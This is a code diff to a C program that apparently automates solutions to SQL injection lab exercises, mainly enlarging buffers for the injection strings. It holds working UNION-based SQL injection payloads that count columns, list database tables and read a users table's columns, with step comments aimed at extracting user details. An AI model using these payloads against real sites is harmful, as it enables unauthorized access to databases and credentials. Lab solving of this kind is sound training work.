@@ -59,12 +59,8 @@ int extract_lab_id(const char *html_content) {
                 }
             }
         }
-
-        if (end == NULL) {
+        else
             break;
-        }
-
-        start = end + strlen(title_end);
     }
 
     return -1;
@@ -506,9 +502,9 @@ int vulnerabilities(char *url) {
                 goto quit;
 
             // step two - retrieve the list of tables in the database
-            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+table_name";
-            char sqli_payload_repeat[] = ",NULL";
-            char sqli_payload_end[] = "+FROM+all_tables--";
+            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+table_name";
+            char sqli_payload_repeat[150] = ",NULL";
+            char sqli_payload_end[30] = "+FROM+all_tables--";
             int f = 1;
             while (f < i) {
                 strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
@@ -533,8 +529,8 @@ int vulnerabilities(char *url) {
             extract_value(response_buffer, ">USERS_", "<", users_table_name, 1);
 
             // step four  - retrieve the details of the columns in the user table
-            char sqli_payload2[] = "/filter?category=Accessories'+UNION+SELECT+column_name";
-            char sqli_payload_repeat2[] = ",NULL";
+            char sqli_payload2[300] = "/filter?category=Accessories'+UNION+SELECT+column_name";
+            char sqli_payload_repeat2[150] = ",NULL";
             char sqli_payload_end2[150] = "";
             snprintf(sqli_payload_end2, 150, "+FROM+all_tab_columns+WHERE+table_name='%s'--", users_table_name);
 
@@ -659,9 +655,9 @@ int vulnerabilities(char *url) {
             extract_value(response_buffer, "ing: '", "\'", db_string, 6);
 
             // step three  - trying replacing each null with the random value
-            char sqli_payload[100] = "/filter?category=Accessories'+UNION+SELECT+NULL";
-            char sqli_payload_repeat[] = ",NULL";
-            char sqli_payload_end[] = "--";
+            char sqli_payload[300] = "/filter?category=Accessories'+UNION+SELECT+NULL";
+            char sqli_payload_repeat[150] = ",NULL";
+            char sqli_payload_end[3] = "--";
             char sqli_payload_repeat2[30] = "";
             snprintf(sqli_payload_repeat2, 30, ",'%s'", db_string);
 
